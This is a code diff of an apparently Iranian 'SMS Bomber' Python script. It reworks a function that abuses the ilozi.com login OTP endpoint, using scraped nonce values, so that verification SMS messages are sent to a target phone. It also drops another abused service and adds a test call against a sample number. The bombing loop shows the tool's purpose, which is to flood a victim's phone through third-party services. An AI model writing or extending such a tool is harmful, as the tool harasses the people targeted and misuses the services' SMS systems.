@@ -35,53 +35,53 @@ def check_internet():
 # ------------------------------
 # SMS Services
 # ------------------------------
+
+import requests
+
+# رنگ‌ها برای چاپ در ترمینال (مثل نمونه شما)
+r = "\033[91m"  # قرمز
+g = "\033[92m"  # سبز
+a = "\033[0m"   # ریست
+
 def ilozi(phone):
-    url = "https://ilozi.com/wp-json/digits/v1/send_otp"
+    url = "https://ilozi.com/wp-admin/admin-ajax.php"
     payload = {
-        "digits_reg_mobile": "0"+phone.split("+98")[1],
-        "digits_reg_countrycode": "98",
-        "type": "register"
+        "action": "digits_forms_ajax",
+        "type": "login",
+        "action_type": "phone",
+        "digits_phone": "0" + phone.split("+98")[1],
+        "instance_id": "a15a96e438ca5771bfd748a1fdf98103",  # از HTML صفحه بگیر
+        "nonce": "b0805527b6",                             # از HTML صفحه بگیر
+        "digits": "1"
     }
+
     headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-        "Accept": "application/json, */*; q=0.1",
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Origin": "https://ilozi.com",
-        "Referer": "https://ilozi.com/?login=true",
-        "X-Requested-With": "XMLHttpRequest"
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": "Mozilla/5.0"
     }
+
     try:
-        response = post(url, data=payload, headers=headers, timeout=5)
-        if response.status_code == 200 and response.json().get("success") is True:
-            print(f"{g}(ilozi){a} Code Sent")
+        response = requests.post(url, data=payload, headers=headers, timeout=5)
+        if response.status_code == 200:
+            print(f'{g}(Ilozi) {a}Code Sent')
             return True
         else:
-            print(f"{r}[-] (ilozi) Failed or No Response{a}")
+            print(f'{r}[-] (Ilozi) Failed or No Response{a}')
             return False
     except Exception as e:
-        print(f"{r}[!] ilozi Exception: {e}{a}")
+        print(f'{r}[!] Ilozi Exception: {e}{a}')
         return False
 
-def alopeyk_safir(phone):
-    url = "https://api.alopeyk.com/safir-service/api/v1/login"
-    payload = {"phone": "0" + phone.split("+98")[1]}
-    try:
-        response = post(url, json=payload, timeout=5)
-        if response.status_code == 200:
-            print(f"{g}(Alopeyk Safir){a} Code Sent")
-            return True
-        else:
-            print(f"{r}[-] (Alopeyk Safir) Failed or No Response{a}")
-            return False
-    except Exception as e:
-        print(f"{r}[!] Alopeyk Safir Exception: {e}{a}")
-        return False
+# تست
+phone = "+989123456789"
+ilozi(phone)
 
 # ------------------------------
 # SMS Bomber
 # ------------------------------
 def Vip(phone, delay_time):
-    services = [ilozi, alopeyk_safir]  # اضافه کردن سرویس‌های جدید به راحتی
+    services = [ilozi, ]  # اضافه کردن سرویس‌های جدید به راحتی
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
     print_slow(f"{g}Target: {y}{phone}")
     print_slow(f"{g}Services: {y}{len(services)}")
